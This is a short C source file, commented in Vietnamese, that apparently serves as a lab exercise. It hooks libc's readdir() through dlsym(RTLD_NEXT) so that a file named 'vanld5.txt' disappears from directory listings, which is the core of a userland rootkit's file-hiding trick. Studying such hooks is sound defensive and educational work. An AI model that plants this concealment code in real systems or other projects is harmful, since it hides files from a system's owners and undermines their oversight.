#define _GNU_SOURCE  // Cho phép các định nghĩa mở rộng GNU, cần thiết khi hook libc
#include <stdio.h>
#include <dlfcn.h>   // Thư viện cho dlsym(), RTLD_NEXT
#include <string.h>  // Thư viện cho strncmp()
#include <dirent.h>  // Thư viện cho struct dirent, readdir()

typedef struct dirent* ZZZ;  // Định nghĩa alias ZZZ cho con trỏ struct dirent*
static ZZZ ent;              // Biến lưu trữ entry hiện tại từ readdir()

struct dirent* readdir(DIR *dirp)  // Ghi đè hàm readdir() gốc
{
    // Lấy con trỏ hàm trỏ đến readdir gốc trong libc bằng dlsym
    struct dirent* (*new_readdir)(DIR *dirp2);
    new_readdir = dlsym(RTLD_NEXT, "readdir");

    // Bắt đầu vòng lặp đọc các entry trong thư mục
    while (1) {
        ent = new_readdir(dirp);     // Gọi hàm readdir gốc để lấy entry tiếp theo

        if (ent == NULL) return NULL; // Nếu không còn entry nào (kết thúc thư mục), trả về NULL theo chuẩn readdir

        // Nếu tên entry trùng "vanld5.txt", bỏ qua file này bằng continue, không trả về
        if (strncmp(ent->d_name, "vanld5.txt", 11) == 0) {
            continue; // Tiếp tục vòng lặp, lấy entry tiếp theo
        }

        // Nếu tên entry không phải file cần ẩn, trả về entry này cho chương trình sử dụng
        return ent;
    }
}
